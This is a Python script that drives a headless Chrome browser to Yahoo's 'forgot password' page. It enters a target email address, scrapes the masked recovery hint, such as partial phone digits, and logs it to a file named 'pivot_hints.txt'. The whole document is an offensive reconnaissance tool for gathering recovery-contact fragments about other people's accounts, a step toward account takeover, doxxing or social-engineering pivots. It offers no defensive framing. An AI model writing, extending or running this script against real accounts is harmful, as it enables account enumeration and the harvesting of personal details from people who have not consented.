import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from colorama import Fore, Style

def check_recovery(email):
    print(f"{Fore.CYAN}[*] Probing recovery info for: {email}{Style.RESET_ALL}")
    
    # Options for Chrome (Chromebook optimized)
    options = webdriver.ChromeOptions()
    options.add_argument('--headless') # Run without opening a window
    driver = webdriver.Chrome(options=options)
    
    try:
        driver.get("https://login.yahoo.com/forgot?")
        driver.find_element(By.ID, "login-signin") # Wait for load
        
        input_field = driver.find_element(By.ID, "username")
        input_field.send_keys(email)
        driver.find_element(By.ID, "login-signin").click()
        
        time.sleep(5) # Wait for redirect
        
        # Capture the 'challenge' text (e.g., "We will send a code to •••• ••• ••12")
        hint = driver.find_element(By.CLASS_NAME, "challenge-desc").text
        print(f"{Fore.GREEN}[+] Recovery Hint Found: {hint}{Style.RESET_ALL}")
        
        with open("pivot_hints.txt", "a") as f:
            f.write(f"Email: {email} | Hint: {hint}\n")
            
    except Exception as e:
        print(f"{Fore.RED}[!] Could not extract hint. Account might not exist.{Style.RESET_ALL}")
    finally:
        driver.quit()

if __name__ == "__main__":
    target = input("Enter Target Email: ")
    check_recovery(target)
